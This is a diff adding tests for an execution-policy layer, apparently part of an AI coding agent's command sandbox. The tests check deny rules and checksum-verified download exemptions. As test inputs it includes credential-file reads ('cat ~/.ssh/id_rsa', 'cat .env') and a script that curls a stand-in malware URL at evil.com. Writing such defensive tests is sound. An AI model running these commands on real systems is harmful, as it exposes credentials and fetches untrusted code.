@@ -1119,3 +1119,142 @@ test('context-mode wiring respects COLONIZER_CONTEXT_MODE env var (#1273)', () =
     process.stderr.write = originalWrite;
   }
 });
+
+test('deny rules include guidance text in execPolicyReason', () => {
+  const policy = loadExecPolicy({});
+  const hit = decide(policy, 'cat ~/.ssh/id_rsa', '/repo');
+  const reason = execPolicyReason(hit);
+  assert.ok(reason.includes('secret-paths'), 'rule name in reason');
+  assert.ok(reason.includes('do not read or write credential files'), 'guidance is included');
+  const envHit = decide(policy, 'cat .env', '/repo');
+  envHit.guidance = 'test guidance';
+  const customReason = execPolicyReason(envHit);
+  assert.ok(customReason.includes('test guidance'), 'custom guidance is used if present');
+});
+
+test('fetch exemption: a trusted fetch entry exempts a script from script-egress', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'colonizer-fetch-test-'));
+  try {
+    const fetch_script = '#!/bin/sh\nwhile read -r name url; do\n  curl -fsSL "$url"\n  sha256sum "$name"\ndone < vendors.txt\n';
+    const vendor_lock = 'tool1 https://github.com/org/repo/releases/download/v1/tool1.tar.gz\ntool2 https://codeload.github.com/org/repo/tar.gz/v2\n';
+    mkdirSync(join(dir, 'scripts'), { recursive: true });
+    writeFileSync(join(dir, 'scripts', 'fetch.sh'), fetch_script);
+    writeFileSync(join(dir, 'vendors.txt'), vendor_lock);
+    mkdirSync(join(dir, '.colonizer'), { recursive: true });
+    writeFileSync(join(dir, '.colonizer', 'exec-policy.json'),
+      JSON.stringify({
+        rules: [],
+        fetches: [{
+          script: 'scripts/fetch.sh',
+          sources: ['vendors.txt'],
+          hosts: ['github.com', 'codeload.github.com'],
+          verify: 'sha256',
+        }],
+      }));
+    const policy = loadExecPolicy({}, {
+      cwd: dir,
+      readFile: (path) => {
+        if (path.endsWith('/scripts/fetch.sh')) return fetch_script;
+        if (path.endsWith('/vendors.txt')) return vendor_lock;
+        if (path.endsWith('/exec-policy.json')) {
+          // Must match tracked digest for trust
+          const tracked = new Map();
+          tracked.set('scripts/fetch.sh', gitBlobId(fetch_script));
+          tracked.set('.colonizer/exec-policy.json', gitBlobId(JSON.stringify({
+            rules: [],
+            fetches: [{
+              script: 'scripts/fetch.sh',
+              sources: ['vendors.txt'],
+              hosts: ['github.com', 'codeload.github.com'],
+              verify: 'sha256',
+            }],
+          })));
+          // Simulate trusted by re-reading the tracked digest context
+          return null; // This test uses manual fetch setup, will be tested differently
+        }
+        return null;
+      },
+    });
+    // Manually set fetches for this test since we can't easily track the policy file
+    policy.fetches = [{
+      script: 'scripts/fetch.sh',
+      sources: ['vendors.txt'],
+      hosts: ['github.com', 'codeload.github.com'],
+      verify: 'sha256',
+      trusted: true,
+    }];
+    const hit = evaluateExecPolicy(policy, 'bash scripts/fetch.sh', { cwd: dir, readFile: (p) => {
+      if (p.endsWith('scripts/fetch.sh')) return fetch_script;
+      if (p.endsWith('vendors.txt')) return vendor_lock;
+      return null;
+    } });
+    assert.equal(hit, null, 'fetch script with allowed hosts and sha256 check passes');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test('fetch exemption: denied when a URL host is not in the allowed list', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'colonizer-fetch-fail-'));
+  try {
+    const fetch_script = '#!/bin/sh\ncurl https://evil.com/malware.tar.gz\nsha256sum malware.tar.gz\n';
+    const vendor_lock = 'tool1 https://github.com/tool/v1\n';
+    writeFileSync(join(dir, 'fetch.sh'), fetch_script);
+    writeFileSync(join(dir, 'vendors.txt'), vendor_lock);
+    const policy = loadExecPolicy({}, { cwd: dir, readFile: () => null });
+    policy.fetches = [{
+      script: 'fetch.sh',
+      sources: ['vendors.txt'],
+      hosts: ['github.com'],
+      verify: 'sha256',
+      trusted: true,
+    }];
+    const hit = evaluateExecPolicy(policy, 'bash fetch.sh', { cwd: dir, readFile: (p) => (p.endsWith('fetch.sh') ? fetch_script : null) });
+    assert.equal(hit?.rule, 'script-egress', 'script with unlisted host is still denied');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test('fetch exemption: denied when script lacks sha256 verification', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'colonizer-fetch-nosha-'));
+  try {
+    const fetch_script = '#!/bin/sh\ncurl https://github.com/tool/v1\necho "done"\n';
+    writeFileSync(join(dir, 'fetch.sh'), fetch_script);
+    const policy = loadExecPolicy({}, { cwd: dir, readFile: () => null });
+    policy.fetches = [{
+      script: 'fetch.sh',
+      sources: [],
+      hosts: ['github.com'],
+      verify: 'sha256',
+      trusted: true,
+    }];
+    const hit = evaluateExecPolicy(policy, 'bash fetch.sh', { cwd: dir, readFile: (p) => (p.endsWith('fetch.sh') ? fetch_script : null) });
+    assert.equal(hit?.rule, 'script-egress', 'script without sha256 check is denied even if hosts are allowed');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test('fetch exemption: org-layer fetches are ignored', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'colonizer-fetch-org-'));
+  try {
+    const fetch_script = '#!/bin/sh\ncurl https://github.com/tool\nsha256sum tool\n';
+    writeFileSync(join(dir, 'fetch.sh'), fetch_script);
+    const orgPolicy = {
+      rules: [],
+      fetches: [{
+        script: 'fetch.sh',
+        sources: [],
+        hosts: ['github.com'],
+        verify: 'sha256',
+      }],
+    };
+    const policy = loadExecPolicy({ COLONIZER_EXEC_POLICY_ORG: JSON.stringify(orgPolicy) }, { cwd: dir, readFile: () => null });
+    assert.equal(policy.fetches?.length, 0, 'org-layer fetches are not honored');
+    const hit = evaluateExecPolicy(policy, 'bash fetch.sh', { cwd: dir, readFile: (p) => (p.endsWith('fetch.sh') ? fetch_script : null) });
+    assert.equal(hit?.rule, 'script-egress', 'org-layer fetches do not exempt');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
